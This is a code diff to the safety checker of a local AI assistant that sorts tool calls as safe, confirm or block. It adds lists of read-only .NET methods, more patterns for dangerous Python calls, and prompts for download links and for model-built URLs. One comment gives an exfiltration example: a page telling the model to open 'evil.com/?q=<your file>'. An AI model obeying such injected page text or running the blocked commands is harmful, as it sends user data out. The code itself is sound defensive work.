@@ -14,14 +14,14 @@ from pathlib import Path
 SAFE, CONFIRM, BLOCK = "safe", "confirm", "block"
 
 TOOL_RISK = {
-    "read_screen": SAFE, "media_control": SAFE, "web_search": SAFE, "get_news": SAFE, "get_weather": SAFE, "convert_currency": SAFE, "read_webpage": SAFE, "system_info": SAFE,
+    "read_screen": SAFE, "media_control": SAFE, "recall_chats": SAFE, "look_at_screen": SAFE, "describe_image": SAFE, "web_search": SAFE, "get_news": SAFE, "get_weather": SAFE, "convert_currency": SAFE, "read_webpage": SAFE, "system_info": SAFE,
     "list_files": SAFE, "read_file": SAFE, "find_files": SAFE, "folder_sizes": SAFE,
     "use_skill": SAFE, "ask_big_ai": SAFE, "run_command": SAFE, "run_python": SAFE,
     "open_app": SAFE, "open_url": SAFE, "play_music": SAFE, "jarvis_settings": SAFE, "play_video": SAFE, "open_incognito": SAFE, "set_volume": SAFE, "open_settings": SAFE,
     "take_note": SAFE, "set_reminder": SAFE, "remember": SAFE, "forget": SAFE, "save_skill": SAFE,
     # additions: look-only or small & easy to undo
     "world_time": SAFE, "network_info": SAFE, "installed_apps": SAFE, "largest_files": SAFE, "read_notes": SAFE,
-    "list_reminders": SAFE, "cancel_reminder": SAFE, "set_timer": SAFE, "add_task": SAFE, "list_tasks": SAFE,
+    "list_reminders": SAFE, "cancel_reminder": SAFE, "snooze_reminder": SAFE, "set_timer": SAFE, "add_task": SAFE, "list_tasks": SAFE,
     "complete_task": SAFE, "media_control": SAFE, "screenshot": SAFE, "lock_pc": SAFE,
     "set_clipboard": SAFE, "get_clipboard": SAFE,
     "chrome_profiles": SAFE, "desktop_look": SAFE,
@@ -54,14 +54,41 @@ WRITE_SIGNS = re.compile(r"(>|\bout-file\b|\bset-content\b|\badd-content\b|::\s*
                          r"\bstart-process\b|\b(route|arp)\s+(add|delete|-d)\b|\bwmic\b)", re.I)
 
 
+# .NET calls inside a command: only these look-only ones keep it "read-only"
+# ($f.Delete(), [Diagnostics.Process]::Start('x'), [IO.File]::Replace(...) all need Allow)
+READ_ONLY_METHODS = {"tostring", "trim", "trimstart", "trimend", "split", "replace", "tolower", "toupper", "substring", "contains",
+                     "startswith", "endswith", "indexof", "lastindexof", "gettype", "equals", "padleft", "padright", "compareto",
+                     "where", "foreach", "getfiles", "getdirectories", "getfilesysteminfos", "getvalue", "getvaluenames",
+                     "getsubkeynames", "tostring", "join", "format", "count", "length", "keys", "values", "tolowerinvariant",
+                     "toupperinvariant", "normalize", "isnullorempty", "isnullorwhitespace", "getenvironmentvariable"}
+READ_ONLY_STATIC = READ_ONLY_METHODS | {
+    "now", "today", "utcnow", "round", "floor", "ceiling", "abs", "max", "min", "pow", "sqrt", "parse", "tryparse", "exists",
+    "readalltext", "readalllines", "getfolderpath", "combine", "getfilename", "getfilenamewithoutextension", "getextension",
+    "getdirectoryname", "gettemppath", "getfullpath", "machinename", "username", "userdomainname", "osversion", "processorcount",
+    "getlogicaldrives", "getdrives", "concat", "fromseconds", "fromminutes", "fromhours", "fromdays", "gethostname",
+    "is64bitoperatingsystem", "version", "currentdirectory", "newline", "tickcount", "tickcount64", "maxvalue", "minvalue",
+    "pi", "e", "truncate", "log", "log10", "getcurrentprocess", "getprocesses", "getprocessesbyname", "allnetworkinterfaces",
+    "getallnetworkinterfaces", "getisnetworkavailable", "gethostentry", "getlastwritetime", "getcreationtime", "getattributes"}
+METHOD_CALL = re.compile(r"(?<!:)\.\s*([A-Za-z_]\w*)\s*\(")
+STATIC_CALL = re.compile(r"\]\s*::\s*([A-Za-z_]\w*)")
+
+
 def is_read_only_command(cmd):
     """True if every command in the line is a known look-only one (Get-*, Select, ipconfig, ...)."""
     if WRITE_SIGNS.search(cmd):
         return False
+    if any(m.lower() not in READ_ONLY_METHODS for m in METHOD_CALL.findall(cmd)):
+        return False
+    if any(m.lower() not in READ_ONLY_STATIC for m in STATIC_CALL.findall(cmd)):
+        return False
     if re.fullmatch(r"\s*[\w.-]+(\.exe)?\s+(--version|-v|-V|version|/\?|--help|-h)\s*", cmd):
         return True   # e.g. "python --version", "git --version"
     for seg in re.split(r"[|;\n{}()]|&&|\|\|", cmd):
-        words = seg.strip().split()
+        seg = seg.strip()
+        m = re.match(r"^\$[\w:.\[\]]+\s*[+\-*/]?=\s*(.*)$", seg)      # "$x = Remove-Item a.txt": judge what's on the right
+        if m:
+            seg = m.group(1)
+        words = seg.split()
         if not words:
             continue
         first = words[0].lower()
@@ -79,7 +106,9 @@ DANGEROUS_PYTHON = re.compile(
     r"(\bos\.(remove|unlink|rmdir|removedirs|rename|renames|replace|system|startfile|chmod|kill)\b|"
     r"\bshutil\.(rmtree|move|copy\w*)\b|\bsubprocess\b|\bopen\([^)]*['\"]\s*[wax+]|\.write_(text|bytes)\(|"
     r"\.(unlink|rmdir|rename|replace|touch|mkdir)\(|\bos\.(mkdir|makedirs)\b|\burllib\b|\brequests\b|\bsocket\b|"
-    r"\bhttp\.|\bctypes\b|\bwinreg\b|\beval\(|\bexec\(|__import__|\bimportlib\b)")
+    r"\bhttp\.|\bctypes\b|\bwinreg\b|\beval\(|\bexec\(|__import__|\bimportlib\b|"
+    r"\.(kill|terminate|suspend|resume|nice|ionice|cpu_affinity)\(|\bwebbrowser\b|\bshutil\b)")
+# (second layer: tools.PY_GUARD stops any change the regex misses, e.g. 'from os import remove')
 
 
 def _inside(p, roots):
@@ -93,11 +122,41 @@ def _path(args, key="path"):
         return None
 
 
-def check(tool, args, user_text):
-    """Return (level, reason). user_text = what YOU typed, not what the model or a website wrote."""
+FILE_LINK = re.compile(r"\.(exe|msi|msix|msixbundle|appx|bat|cmd|ps1|vbs|vbe|js|jse|wsf|hta|jar|scr|com|cpl|lnk|reg|zip|rar|7z|"
+                       r"iso|img|apk|dmg|torrent)([?#]|$)", re.I)
+URL_TOOLS = ("open_url", "read_webpage", "open_incognito")
+
+
+def _norm_url(u):
+    u = re.sub(r"^\s*(https?://)?(www\.)?", "", str(u).strip().lower())
+    return u.rstrip("/")
+
+
+def url_known(url, sources):
+    """Did this web address come from the user or a tool result (not built by the model)? Just a site ('github.com')
+    is always fine - there's no room in it to carry your data."""
+    n = _norm_url(url)
+    if not n or re.fullmatch(r"[a-z0-9.-]+", n):
+        return True
+    return n.split("#")[0] in _norm_url(" ".join(sources))
+
+
+def check(tool, args, user_text, sources=None):
+    """Return (level, reason). user_text = what YOU typed, not what the model or a website wrote.
+    sources: text this turn's tools returned (web pages, files, screen ...) - None if nothing was read yet."""
     if tool not in TOOL_RISK:
         return BLOCK, f"unknown action '{tool}'"
     args = args or {}
+
+    if tool in URL_TOOLS and str(args.get("url", "")).strip():
+        url = str(args.get("url", ""))
+        path = re.sub(r"^\s*(https?://)?[^/]*", "", url)
+        if FILE_LINK.search(path.split("?")[0].split("#")[0]) or FILE_LINK.search(path):
+            return CONFIRM, f"this link downloads a file: {url[:150]}"
+        # after reading pages/files/screen, a web address the model made up itself could carry your data out
+        # (a page saying 'open evil.com/?q=<your file>'): ask first
+        if sources is not None and not url_known(url, [user_text] + list(sources)):
+            return CONFIRM, f"opens a web address I put together after reading other content (it could send data out): {url[:150]}"
 
     if tool == "run_command":
         cmd = str(args.get("command", ""))
